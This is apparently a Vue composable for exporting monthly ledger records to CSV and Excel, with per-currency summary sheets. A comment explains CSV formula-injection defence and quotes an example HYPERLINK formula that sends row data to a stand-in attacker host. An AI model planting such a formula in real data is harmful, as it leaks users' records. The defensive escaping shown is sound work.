/**
 * 账单导出（按月，人类可读）—— CSV 与 xlsx（从 LedgerView.vue 拆出）。
 *
 * 「币种」放在「金额」后面：金额列的语义仍是记录原值（不折算、不换算），
 * 但必须紧跟着单位，否则一笔 100 USD 导出成孤零零的 `100` 会被读成 100 元。
 * 基准币种的记录写的也是基准币种代码，所以老数据导出后不会出现空列。
 *
 * 「我承担」紧挨着「金额」：导出的 CSV/Excel 里两个口径都在——
 * 金额 = 这一笔的总额（记录原值），我承担 = 这一笔里我实际承担多少（无分摊时两者相等）。
 * 分摊只影响「我承担」这一列，金额列与既有导出一字不差，老表格脚本不会被打断。
 *
 * 「导出哪个月」由回顾分区决定，但那段状态还在页面里，所以用 getter 传进来；
 * 其余（口径函数、基准币种、提示）同样是页面已有的东西，不重复造一份。
 */
import { catInfo, expenses, isRefundTransaction, isValidDateKey } from '../ledger.js'
import { mySpendCents } from '../ledgerSplit.js'
import { normalizeCurrency } from '../ledgerFx.js'

export function useLedgerExport({ getMonth, personalAmount, baseCurrency, notify }) {
  const EXPORT_COLUMNS = ['日期', '时间', '名称', '分类', '收支', '金额', '我承担', '币种', '账户', '备注']
  // 明细表各列的显示宽度。SheetJS 社区版不写样式，只能靠列宽和数字格式让文件
  // 「看起来是给人看的」；不设的话 Excel 会按表头文字宽度排，日期和备注会被截断。
  const COLUMN_WIDTHS = { 日期: 12, 时间: 8, 名称: 22, 分类: 12, 收支: 8, 金额: 12, 我承担: 12, 币种: 8, 账户: 14, 备注: 28 }
  const MONEY_FORMAT = '#,##0.00'
  /** 导出范围的人话描述，用于提示文案（「该月…」/「全部历史…」）。 */
  function scopeLabel() {
    return getMonth() === 'all' ? '全部历史' : '该月'
  }
  /**
   * 这一条记录算不算在导出范围内。
   *
   * 【必须与界面合计是同一个集合】此前这里只过滤三个可见性标记 + 月份前缀，
   * 于是 `{date:'2026-02-31', amount:66}` 这种非法日期、或缺 id 的记录会进「账单明细」，
   * 但同一次导出的汇总、以及回顾页的合计都按 ledgerAmountCents 的完整判据把它们排除
   * → 表头「共 N 条」与表里的金额自相矛盾。日期合法性与 id 都补上了。
   *
   * 判据刻意**不要求金额必须能精确到分**：金额解析不了的记录，汇总会逐条跳过它
   * （summarizeByCurrency 内部判 mySpendCents），而明细行仍把原始数值原样写出。
   * 这与「明细从不改写金额、只做展示」的既有约定一致——用户在明细里看得到原值、
   * 在合计里看不到它，那才是真实的账。若这里也按金额过滤，这条记录会从导出里
   * 彻底消失，用户反而无从发现它存在，那比多导出一行更糟。
   */
  function isValidLedgerItem(item) {
    if (!item || typeof item !== 'object') return false
    if (item.archivedAt || item.deletedAt || item.tombstone) return false
    if (!String(item.id ?? '').trim()) return false
    return isValidDateKey(item.date)
  }

  /**
 * 导出范围。
 *
 * `getMonth()` 返回 `'all'` 时导出全部历史。
 */
function exportItems(scope = getMonth()) {
    const month = scope === 'all' ? '' : String(scope)
    return expenses.value
      .filter((item) => isValidLedgerItem(item) && (!month || String(item.date).slice(0, 7) === month))
      .sort((a, b) => `${a.date}${a.time || ''}`.localeCompare(`${b.date}${b.time || ''}`))
  }
  function currencyOf(item) {
    return normalizeCurrency(item.currency) || baseCurrency.value
  }
  function ledgerExportRows(items = exportItems()) {

    return items.map((item) => ({
      '日期': item.date,
      '时间': item.time || '',
      '名称': item.name,
      '分类': catInfo(item.cat).name,
      '收支': item.direction === 'income' ? '收入' : item.direction === 'refund' ? '退款' : '支出',
      '金额': item.amount,
      '我承担': personalAmount(item),
      '币种': currencyOf(item),
      '账户': item.account || '',
      '备注': item.note || '',
    }))
  }

  /**
   * 汇总口径：**按币种分开**统计，用「我承担」而不是「金额」。
   *
   * 为什么分币种：明细里的金额是记录原值、**从不折算**（这是本模块一贯的约定，
   * 见文件头），所以把 100 USD 和 100 CNY 加起来得到的那个数没有任何意义。
   * 为什么用「我承担」：分摊存在时「金额」是这一笔的总额，而用户真正花掉的是自己
   * 那一份；账本首页的「本月花费」也是这个口径，导出与界面必须一致。
   *
   * 退款抵减支出的算法沿用 ledgerSplit.personalSpendTotals：
   * expenseTotal = 支出 - 退款。
   */
  function summarizeByCurrency(items) {
    const buckets = new Map()
    const bucketFor = (code) => {
      let entry = buckets.get(code)
      if (!entry) {
        entry = { code, expenseCents: 0, expenseCount: 0, incomeCents: 0, refundCents: 0, categories: new Map() }
        buckets.set(code, entry)
      }
      return entry
    }
    for (const item of items) {
      const cents = mySpendCents(item)
      if (cents === null) continue
      const entry = bucketFor(currencyOf(item))
      if (item.direction === 'income') {
        entry.incomeCents += cents
      } else if (isRefundTransaction(item)) {
        entry.refundCents += cents
      } else {
        entry.expenseCents += cents
        entry.expenseCount += 1
        const key = item.cat || 'other'
        entry.categories.set(key, (entry.categories.get(key) ?? 0) + cents)
      }
    }
    // 基准币种排最前，其余按字母序，保证每次导出顺序稳定。
    return [...buckets.values()].sort((a, b) => (
      a.code === baseCurrency.value ? -1 : b.code === baseCurrency.value ? 1 : a.code.localeCompare(b.code)
    ))
  }

  /** 给一个已存在的单元格套上数字格式；单元格不存在就跳过（避免造出空单元格）。 */
  function applyFormat(XLSX, sheet, row, col, format) {
    const address = XLSX.utils.encode_cell({ r: row, c: col })
    if (!sheet[address]) return
    sheet[address] = { ...sheet[address], z: format }
  }

  /**
   * 汇总表：一屏就能看清「这个月花了多少」，以及钱花在哪。
   *
   * 【为什么边建边记地址】数字格式必须落到具体单元格上。最早的写法是回头按行号
   * 反推（"合计区是第 4~8 行"、"分类表从第 10 行起逐块累加"），一旦往表格里加一行
   * 就全错，而且错了不会报错——只是金额变成一串裸数字。所以这里改成构建时就记下
   * 每一处需要格式化的坐标，格式跟着内容走，不再依赖任何行号推算。
   */
  function buildSummarySheet(XLSX, items) {
    const month = getMonth()
    const buckets = summarizeByCurrency(items)
    const currencyCodes = buckets.length ? buckets.map((b) => b.code) : [baseCurrency.value]
    const aoa = []
    // 需要套金额/百分比格式的坐标，边构建边收集。
    const moneyCells = []
    const percentCells = []
    const pushMoneyRow = (label, valueFor) => {
      const row = aoa.length
      aoa.push([label, ...currencyCodes.map(valueFor)])
      currencyCodes.forEach((_, index) => moneyCells.push([row, index + 1]))
      return row
    }

    aoa.push([`账单支出汇总 · ${month}`])
    aoa.push([`共 ${items.length} 条记录`, `生成时间：${new Date().toLocaleString('zh-CN')}`])
    aoa.push([])
    aoa.push(['项目', ...currencyCodes])
    pushMoneyRow('支出合计', (code) => (buckets.find((b) => b.code === code)?.expenseCents ?? 0) / 100)
    pushMoneyRow('　其中 退款', (code) => (buckets.find((b) => b.code === code)?.refundCents ?? 0) / 100)
    pushMoneyRow('支出净额（支出 − 退款）', (code) => {
      const entry = buckets.find((b) => b.code === code)
      return entry ? (entry.expenseCents - entry.refundCents) / 100 : 0
    })
    // 笔数用整数格式，别让「5」显示成「5.00」
    const countRow = aoa.length
    aoa.push(['支出笔数', ...currencyCodes.map((code) => buckets.find((b) => b.code === code)?.expenseCount ?? 0)])
    aoa.push([])

    // 分类排行：每个币种一张小表，直接回答「钱花在哪了」。
    const TOP_N = 10
    for (const entry of buckets) {
      const ranked = [...entry.categories.entries()].sort((a, b) => b[1] - a[1]).slice(0, TOP_N)
      if (!ranked.length) continue
      aoa.push([`支出分类 Top ${ranked.length}（${entry.code}）`])
      aoa.push(['分类', '金额', '占支出比例'])
      // 分母用**毛支出**而不是支出净额：净额已经扣掉退款，而分类金额没有扣，
      // 拿净额当分母会出现「餐饮占 102%」这种一眼就假的数字（实测踩过）。
      // 用毛支出则各分类占比之和正好是 100%，读起来才成立。
      const expenseYuan = entry.expenseCents / 100
      for (const [cat, cents] of ranked) {
        const yuan = cents / 100
        const row = aoa.length
        aoa.push([catInfo(cat).name, yuan, expenseYuan > 0 ? yuan / expenseYuan : 0])
        moneyCells.push([row, 1])
        percentCells.push([row, 2])
      }
      aoa.push([])
    }
    aoa.push(['说明：本表只统计支出，不含收入。'])
    aoa.push(['说明：金额为「我承担」口径（分摊时只算自己那份）；不同币种不做折算，故按币种分列。'])
    aoa.push(['说明：支出净额已扣掉退款，与账本首页「本月花费」口径一致。'])

    const sheet = XLSX.utils.aoa_to_sheet(aoa)
    sheet['!cols'] = [
      { wch: 26 },
      ...currencyCodes.map(() => ({ wch: 16 })),
      { wch: 12 },
    ]
    for (const [row, col] of moneyCells) applyFormat(XLSX, sheet, row, col, MONEY_FORMAT)
    for (const [row, col] of percentCells) applyFormat(XLSX, sheet, row, col, '0.0%')
    currencyCodes.forEach((_, index) => applyFormat(XLSX, sheet, countRow, index + 1, '0'))
    return sheet
  }
  function downloadLedgerFile(blob, filename) {
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = filename
    document.body.appendChild(link)
    link.click()
    link.remove()
    window.setTimeout(() => URL.revokeObjectURL(url), 0)
  }
  /**
 * CSV 单元格。
 *
 * 除了 RFC-4180 的引号转义，还必须**中和公式前缀**：Excel/LibreOffice 会把
 * 以 `=` `+` `-` `@`（以及 Tab/CR）开头的单元格当公式求值，而 `名称`/`备注`/
 * `账户`/`分类` 全是用户自由文本。记一笔名为
 * `=HYPERLINK("https://evil.example/?d="&A1,"点我")` 就能把本行内容外发。
 *
 * 注意：**给单元格加引号并不能阻止求值**（RFC-4180 的引号只管分隔与转义），
 * 所以这里对危险前缀统一前置一个单引号——Excel 把它当「文本标记」吃掉，
 * 显示出来的仍是原文。
 */
function csvCell(value) {
  const text = String(value ?? '')
  const safe = /^[=+\-@\t\r]/.test(text) ? `'${text}` : text
  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe
}
  function exportLedgerCsv() {
    const rows = ledgerExportRows()
    if (!rows.length) { notify(scopeLabel() + '还没有可导出的记录'); return }
    const lines = [EXPORT_COLUMNS.join(',')].concat(
      rows.map((row) => EXPORT_COLUMNS.map((col) => csvCell(row[col])).join(','))
    )
    downloadLedgerFile(new Blob(['\uFEFF' + lines.join('\r\n')], { type: 'text/csv;charset=utf-8' }), `账单-${getMonth() === 'all' ? '全部' : getMonth()}.csv`)
    notify(`已导出 ${rows.length} 条账单 CSV`)
  }
  /**
 * 导出 Excel。`scope` 默认当月；传 `'all'` 导出全部历史。
 *
 * 此前导出被硬编码成 `getMonth()`，想拿完整数据只能一个月一个月点。
 */
async function exportLedgerXlsx(scope = getMonth()) {
    const items = exportItems(scope)
    if (!items.length) { notify(scope === 'all' ? '全部历史还没有可导出的记录' : '该月还没有可导出的记录'); return }
    const XLSX = await import('@e965/xlsx')
    const workbook = XLSX.utils.book_new()
    // 汇总表放在**第一个**：Excel 打开文件时显示的就是它，一眼能看到花了多少。
    XLSX.utils.book_append_sheet(workbook, buildSummarySheet(XLSX, items), '汇总')

    // 明细也用**同一份快照**：原先这里重新调 `ledgerExportRows()`，
    // 而它内部再取一次 exportItems()。中间隔着一个 `await import(...)`，
    // 期间任何写入（同步拉取、撤销 toast、另一个标签页的 storage 事件）都会让
    // 「汇总」与「账单明细」描述两个不同时刻的账本，`!autofilter` 的行数也会错位。
    const rows = ledgerExportRows(items)
    const worksheet = XLSX.utils.json_to_sheet(rows, { header: EXPORT_COLUMNS })
    worksheet['!cols'] = EXPORT_COLUMNS.map((col) => ({ wch: COLUMN_WIDTHS[col] ?? 12 }))
    // 明细的可读性只能靠这三样，因为 SheetJS 社区版**不写样式**：
    //   - `!cols`  列宽。不设的话 Excel 按表头文字宽度排，日期和备注会被截断。
    //   - `!autofilter` 表头筛选下拉。明细几百上千行时，这是唯一能快速定位的手段。
    //   - `z` 数字格式。千分位 + 两位小数，否则 1234.5 就显示成 1234.5。
    // 「冻结首行」和「表头加粗」社区版做不到（实测 !freeze 会被直接丢弃，
    // 写进文件的 sheetView 里没有 pane 节点）；要那两项得换成 xlsx-js-style，
    // 代价是换掉整条导出链路，不值当，故此处不假装支持。
    worksheet['!autofilter'] = { ref: `A1:${XLSX.utils.encode_col(EXPORT_COLUMNS.length - 1)}${items.length + 1}` }
    // 金额列千分位 + 两位小数。不设格式时 Excel 显示 1020 而不是 1,020.00。
    for (let row = 1; row <= items.length; row += 1) {
      for (const col of ['金额', '我承担']) {
        applyFormat(XLSX, worksheet, row, EXPORT_COLUMNS.indexOf(col), MONEY_FORMAT)
      }
    }
    XLSX.utils.book_append_sheet(workbook, worksheet, '账单明细')

    const output = XLSX.write(workbook, { bookType: 'xlsx', type: 'array' })
    downloadLedgerFile(new Blob([output], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `账单-${scope === 'all' ? '全部' : scope}.xlsx`)
    notify(`已导出 ${items.length} 条账单 Excel`)
  }

  /** 回顾页「导出全部」按钮：导出不限月份的完整历史。 */
  function exportAllLedgerXlsx() {
    return exportLedgerXlsx('all')
  }

  return { exportLedgerCsv, exportLedgerXlsx, exportAllLedgerXlsx }
}
